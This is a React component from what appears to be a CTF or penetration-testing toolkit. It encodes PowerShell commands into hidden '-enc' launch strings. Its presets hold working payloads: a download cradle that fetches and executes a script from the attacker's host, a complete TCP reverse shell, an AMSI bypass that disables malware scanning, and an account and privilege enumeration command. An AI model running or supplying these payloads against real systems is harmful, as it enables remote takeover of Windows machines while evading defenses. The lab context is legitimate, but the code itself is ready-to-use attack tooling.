import React, { useState, useMemo } from 'react';
import { Copy, Check, Sparkles, Cpu } from 'lucide-react';
import { encodeUtf16LeBase64 } from '../../utils/shellEncoders';
import { safeCopyToClipboard, playCyberSound } from '../../utils/helpers';
import { toast } from '../../store/useToastStore';
import { useCtfStore } from '../../store/useCtfStore';

export const PowerShellEncoderTool: React.FC = () => {
  const { globalVars, soundEnabled } = useCtfStore();
  const lhost = globalVars.lhost || '10.10.14.X';
  const lport = globalVars.lport || '4444';

  const defaultCommand = `IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:8000/rev.ps1')`;
  const [inputCommand, setInputCommand] = useState(defaultCommand);
  const [includeNoProfile, setIncludeNoProfile] = useState(true);
  const [includeHidden, setIncludeHidden] = useState(true);
  const [includeNonInteractive, setIncludeNonInteractive] = useState(true);
  const [copied, setCopied] = useState(false);

  const base64Encoded = useMemo(() => {
    return encodeUtf16LeBase64(inputCommand);
  }, [inputCommand]);

  const fullCommandLine = useMemo(() => {
    if (!base64Encoded) return '';
    const flags: string[] = [];
    if (includeNoProfile) flags.push('-nop');
    if (includeHidden) flags.push('-w hidden');
    if (includeNonInteractive) flags.push('-noni');
    flags.push('-enc', base64Encoded);
    return `powershell.exe ${flags.join(' ')}`;
  }, [base64Encoded, includeNoProfile, includeHidden, includeNonInteractive]);

  const handleCopy = async () => {
    if (!fullCommandLine) return;
    const ok = await safeCopyToClipboard(fullCommandLine);
    if (ok) {
      setCopied(true);
      toast.success('PowerShell encoded command copied');
      if (soundEnabled) playCyberSound('copy');
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const presets = [
    {
      label: 'Download Cradle (IEX WebClient)',
      code: `IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:8000/rev.ps1')`,
    },
    {
      label: 'Simple TCP Reverse Shell',
      code: `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    },
    {
      label: 'AMSI Memory Patch (Matt Graeber)',
      code: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
    },
    {
      label: 'Whoami & Privileges Dump',
      code: `whoami /all; net user; net localgroup administrators`,
    },
  ];

  return (
    <div className="space-y-5">
      {/* Header Banner */}
      <div className="p-4 rounded-xl border border-subtle bg-surface-card space-y-1.5">
        <div className="flex items-center gap-2">
          <Cpu className="w-4 h-4 text-accent" />
          <h3 className="text-sm font-semibold text-primary">PowerShell UTF-16LE Base64 Encoder (-EncodedCommand)</h3>
        </div>
        <p className="text-xs text-muted leading-relaxed">
          Windows PowerShell expects Base64 strings passed via <code className="text-accent">-enc / -EncodedCommand</code> to be encoded in 16-bit little-endian Unicode (UTF-16LE). Standard UTF-8 base64 will fail.
        </p>
      </div>

      {/* Preset pills */}
      <div className="space-y-1.5">
        <label className="text-xs font-medium text-secondary">Quick Presets</label>
        <div className="flex flex-wrap gap-1.5">
          {presets.map((p) => (
            <button
              key={p.label}
              type="button"
              onClick={() => {
                setInputCommand(p.code);
                if (soundEnabled) playCyberSound('click');
              }}
              className="px-2.5 py-1 rounded-lg border border-subtle bg-surface-card hover:border-accent hover:text-accent text-xs text-secondary transition-colors cursor-pointer"
            >
              {p.label}
            </button>
          ))}
        </div>
      </div>

      {/* Input Section */}
      <div className="space-y-2">
        <div className="flex items-center justify-between text-xs">
          <label className="font-medium text-primary">PowerShell Script / Command Input</label>
          <span className="font-mono text-muted text-[11px]">{inputCommand.length} characters</span>
        </div>
        <textarea
          rows={5}
          value={inputCommand}
          onChange={(e) => setInputCommand(e.target.value)}
          placeholder="Enter raw PowerShell command..."
          className="w-full p-3 rounded-xl bg-surface-sunken border border-subtle font-mono text-xs text-primary focus:border-accent focus:outline-none resize-y"
        />
      </div>

      {/* Flag Checkboxes */}
      <div className="flex flex-wrap items-center gap-4 text-xs text-secondary">
        <label className="flex items-center gap-1.5 cursor-pointer select-none">
          <input
            type="checkbox"
            checked={includeNoProfile}
            onChange={(e) => setIncludeNoProfile(e.target.checked)}
            className="rounded border-subtle text-accent focus:ring-accent/40"
          />
          <span>-nop (NoProfile)</span>
        </label>
        <label className="flex items-center gap-1.5 cursor-pointer select-none">
          <input
            type="checkbox"
            checked={includeHidden}
            onChange={(e) => setIncludeHidden(e.target.checked)}
            className="rounded border-subtle text-accent focus:ring-accent/40"
          />
          <span>-w hidden (WindowStyle Hidden)</span>
        </label>
        <label className="flex items-center gap-1.5 cursor-pointer select-none">
          <input
            type="checkbox"
            checked={includeNonInteractive}
            onChange={(e) => setIncludeNonInteractive(e.target.checked)}
            className="rounded border-subtle text-accent focus:ring-accent/40"
          />
          <span>-noni (NonInteractive)</span>
        </label>
      </div>

      {/* Output Section */}
      <div className="space-y-2">
        <div className="flex items-center justify-between text-xs">
          <label className="font-semibold text-primary flex items-center gap-1.5">
            <Sparkles className="w-3.5 h-3.5 text-accent" />
            <span>Encoded Execution String</span>
          </label>
          <span className="font-mono text-muted text-[11px]">{fullCommandLine.length} characters</span>
        </div>

        <div className="relative group">
          <pre className="p-3.5 rounded-xl bg-surface-sunken border border-subtle font-mono text-xs text-primary overflow-x-auto whitespace-pre-wrap break-all select-all">
            {fullCommandLine || '# Enter a command above to see encoded output'}
          </pre>
          {fullCommandLine && (
            <button
              type="button"
              onClick={handleCopy}
              className={`absolute right-2.5 top-2.5 px-3 py-1.5 rounded-lg border text-xs font-medium transition-colors cursor-pointer active:scale-95 inline-flex items-center gap-1.5 shadow-xs ${
                copied
                  ? 'bg-callout-success-bg text-callout-success-fg border-callout-success-border'
                  : 'bg-surface-card border-subtle text-secondary hover:text-accent hover:border-accent'
              }`}
            >
              {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copied ? 'Copied' : 'Copy Command'}</span>
            </button>
          )}
        </div>
      </div>
    </div>
  );
};
